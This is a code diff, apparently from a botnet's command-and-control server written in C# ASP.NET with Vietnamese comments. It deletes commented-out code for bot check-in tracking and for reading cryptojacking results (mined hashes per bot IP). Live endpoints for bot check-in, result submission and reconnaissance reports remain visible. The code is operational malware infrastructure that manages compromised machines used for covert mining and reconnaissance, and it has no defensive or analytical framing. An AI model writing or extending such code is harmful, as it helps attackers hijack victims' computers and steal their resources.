@@ -46,11 +46,6 @@ namespace CncServer.Controllers
         public string Report { get; set; } = string.Empty;
     }
 
-    //public class LogRequest
-    //{
-    //    public string BotIp { get; set; } = string.Empty;
-    //    public string Message { get; set; } = string.Empty;
-    //}
 
     [ApiController]
     [Route("bot")]
@@ -106,21 +101,6 @@ namespace CncServer.Controllers
         [HttpPost("checkin")]
         public IActionResult CheckIn([FromBody] BotInfoPayload payload)
         {
-            // Tự động gán BotIp bằng IP của người gửi request
-            //string ip = GetBotIp();
-            //var botInfo = new BotInfo
-            //{
-            //    BotIp = ip,                              // ← ĐỔI TÊN
-            //    LastSeen = DateTime.UtcNow,
-            //    Status = payload?.Status ?? "unknown"
-            //};
-
-
-            //_bots[ip] = botInfo;
-            //Console.ForegroundColor = ConsoleColor.Blue;
-            //Console.WriteLine($"[+] Bot connected from: {ip} | Status: {botInfo.Status}");
-            //Console.ResetColor();
-            //return Ok();
             string ip = GetBotIp();
             string newStatus = payload?.Status ?? "unknown";
 
@@ -263,46 +243,6 @@ namespace CncServer.Controllers
             return Ok("Result received.");
         }
 
-        //[HttpGet("results")]
-        ////public IActionResult GetResults()
-        ////{
-        ////    return Ok(_results.OrderByDescending(r => r.Timestamp));
-        ////}
-        //public IActionResult GetResults()
-        //{
-        //    var results = new List<CryptoJackResult>();
-        //    string logFilePath = Path.Combine(LogFolder, MinedHashesFileName);
-
-        //    lock (_fileLock)
-        //    {
-        //        if (System.IO.File.Exists(logFilePath))
-        //        {
-        //            var lines = System.IO.File.ReadAllLines(logFilePath);
-        //            foreach (var line in lines)
-        //            {
-        //                try
-        //                {
-        //                    // Tách chuỗi dựa trên dấu |
-        //                    var parts = line.Split('|');
-        //                    if (parts.Length >= 4)
-        //                    {
-        //                        results.Add(new CryptoJackResult
-        //                        {
-        //                            Timestamp = DateTime.Parse(parts[0]),
-        //                            BotIp = parts[1],
-        //                            Nonce = long.Parse(parts[2]),
-        //                            Hash = parts[3]
-        //                        });
-        //                    }
-        //                }
-        //                catch { /* Bỏ qua dòng lỗi */ }
-        //            }
-        //        }
-        //    }
-
-        //    // Trả về danh sách mới nhất lên đầu
-        //    return Ok(results.OrderByDescending(r => r.Timestamp));
-        //}
 
         [HttpPost("submitrecon")]
         public IActionResult SubmitRecon([FromBody] ReconPayload payload)
